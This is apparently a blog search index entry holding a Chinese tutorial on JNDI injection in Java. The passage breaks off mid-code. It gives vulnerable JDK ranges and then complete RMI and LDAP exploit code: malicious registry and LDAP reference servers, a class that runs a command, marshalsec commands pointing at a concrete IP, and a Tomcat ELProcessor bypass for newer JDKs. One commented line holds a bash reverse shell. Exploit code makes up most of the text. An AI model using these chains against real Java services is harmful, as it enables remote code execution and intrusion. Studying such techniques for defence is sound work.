<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>JNDI注入</title>
    <link href="/2024/09/24/JNDI%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/09/24/JNDI%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="基础"><a class="markdownIt-Anchor" href="#基础"></a> 基础</h3><p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，同的访问提供者实现 JNDI 服务供应接口 (SPI)，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。<code>JNDI</code>可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code>。</p><ul><li><code>LDAP</code>: 轻量级目录访问协议；名称也是从右到左进行逐级定义，各级以逗号分隔，每级为一个 <code>name=value</code> 对。比如一个 <code>LDAP</code> 名称如下:</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">cn</span>=John, <span class="hljs-attribute">o</span>=Sun, <span class="hljs-attribute">c</span>=US<br></code></pre></td></tr></table></figure><ul><li><code>RMI</code>: <code>Java Remote Method Invocation</code>，<code>Java</code> 远程方法调用；</li><li><code>DNS</code>：域名服务</li><li><code>NIS</code>: <code>Network Information Service，Solaris</code> 系统中用于查找系统相关信息的目录服务；</li><li><code>CORBA</code>: <code>Common Object Request Broker Architecture</code>，通用对象请求代理架构，用于 <code>COS</code> 名称服务(<code>Common Object Services</code>)；</li></ul><h4 id="naming-service-命名服务"><a class="markdownIt-Anchor" href="#naming-service-命名服务"></a> Naming Service 命名服务</h4><p>命名服务将名称和对象进行关联，提供通过名称找到对象的操作。</p><ul><li>相关概念：<ul><li><code>Bindings</code>: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 <code>DNS</code> 中域名绑定到对应的 <code>IP</code>。</li><li><code>Context</code>: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (<code>subcontext</code>)。</li><li><code>References</code>: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 <code>C/C++</code> 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 <code>fd</code> (<code>file descriptor</code>)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li></ul></li></ul><h4 id="directory-service-目录服务"><a class="markdownIt-Anchor" href="#directory-service-目录服务"></a> Directory Service 目录服务</h4><p>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。由此，我们不仅可以根据名称去查找(<code>lookup</code>)对象(并获取其对应属性)，还可以根据属性值去搜索(<code>search</code>)对象。</p><h4 id="api"><a class="markdownIt-Anchor" href="#api"></a> API</h4><p><code>JNDI</code>，即 <code>Java</code> 的名称与目录服务接口，应用通过该接口与具体的目录服务进行交互。从设计上，<code>JNDI</code> 独立于具体的目录服务实现，因此可以针对不同的目录服务提供统一的操作接口。</p><h3 id="jndi注入"><a class="markdownIt-Anchor" href="#jndi注入"></a> JNDI注入</h3><p>JNDI 注入，即当开发者在定义 <code>JNDI</code> 接口初始化时，<code>lookup()</code> 方法的参数可控，攻击者就可以将恶意的 <code>url</code> 传入参数远程加载恶意载荷，造成注入攻击。</p><p>JNDI 注入对 JAVA 版本有相应的限制，具体可利用版本如下：</p><table><thead><tr><th>协议</th><th>JDK6</th><th>JDK7</th><th>JDK8</th><th>JDK11</th></tr></thead><tbody><tr><td>LADP</td><td>6u211以下</td><td>7u201以下</td><td>8u191以下</td><td>11.0.1以下</td></tr><tr><td>RMI</td><td>6u132以下</td><td>7u122以下</td><td>8u113以下</td><td>无</td></tr></tbody></table><p><strong>调用链</strong></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">I<span class="hljs-function"><span class="hljs-title">nitialContext</span>.lookup-&gt;</span>G<span class="hljs-function"><span class="hljs-title">enericURLContext</span>.lookup-&gt;</span>R<span class="hljs-function"><span class="hljs-title">egistryContext</span>.lookup-&gt;</span>R<span class="hljs-function"><span class="hljs-title">egistryImpl_Stub</span>.lookup-&gt;</span>R<span class="hljs-function"><span class="hljs-title">egistryContext</span>.decodeObject-&gt;</span>N<span class="hljs-function"><span class="hljs-title">amingManager</span>.getObjectInstance-&gt;</span>N<span class="hljs-function"><span class="hljs-title">amingManager</span>.getObjectFactoryFromReference-&gt;</span><span class="hljs-function"><span class="hljs-title">helper</span>.loadClass-&gt;</span>helper.loadClass.newInstance<br></code></pre></td></tr></table></figure><h4 id="rmi"><a class="markdownIt-Anchor" href="#rmi"></a> RMI</h4><h5 id="低版本"><a class="markdownIt-Anchor" href="#低版本"></a> 低版本</h5><p><strong>服务端</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Calculator&quot;</span>,<span class="hljs-string">&quot;Calculator&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:9090/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;RCE&quot;</span>,wrapper);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>恶意类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calculator</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>客户端</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>       String uri=<span class="hljs-string">&quot;rmi://127.0.0.1:1099/RCE&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>不用工具不知道为什么服务端和客户端不在同一主机上打不了</p><p>使用工具开恶意服务端<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server <span class="hljs-number">9090</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer http://<span class="hljs-number">8.138.10.69:9090</span>/#Calculator <span class="hljs-number">1099</span><br></code></pre></td></tr></table></figure><h5 id="高版本"><a class="markdownIt-Anchor" href="#高版本"></a> 高版本</h5><p><code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code>，运行时需加入参数 <code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</code> 。因为如果 <code>JDK</code> 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 <code>RMI</code> 代码。</p><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-embed-el<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.15<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>服务端</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1089</span>);<br>            <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>            <span class="hljs-comment">// ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;]).start()\&quot;)&quot;));</span><br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));<br><br>            <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>            registry.bind(<span class="hljs-string">&quot;calc&quot;</span>, referenceWrapper);<br>            System.err.println(<span class="hljs-string">&quot;Server ready&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;Server exception: &quot;</span> + e.toString());<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>客户端</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>       String uri=<span class="hljs-string">&quot;rmi://127.0.0.1:1089/calc&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ldap"><a class="markdownIt-Anchor" href="#ldap"></a> LDAP</h4><h5 id="低版本-2"><a class="markdownIt-Anchor" href="#低版本-2"></a> 低版本</h5><p>下载<a href="https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1">https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1</a></p><p>添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>服务端</strong></p><p>使用<a href="https://github.com/mbechler/marshalsec">工具</a>启动恶意服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.LDAPRefServer http://<span class="hljs-number">8.138.10.69:9090</span>/#Calculator <span class="hljs-number">1099</span><br></code></pre></td></tr></table></figure><p>或者用脚本（其实就是工具中的脚本）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:9090/#Calculator&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1099</span>;<br><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>,<br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                    port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br>        &#125;<br><br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>客户端</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://8.138.10.69:1099/Calculator&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    